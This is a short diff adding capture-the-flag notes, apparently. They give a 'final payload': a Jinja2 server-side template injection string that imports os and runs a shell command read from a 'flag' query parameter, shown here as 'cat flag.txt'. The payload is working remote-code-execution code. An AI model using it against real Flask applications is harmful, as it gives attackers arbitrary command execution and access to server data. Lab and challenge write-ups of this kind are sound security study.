@@ -1,0 +1,3 @@
+- we run multiple services
+
+- final payload: {{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')(request|attr('args')|attr('get')('flag'))|attr('read')()}}&flag=cat%20flag.txt
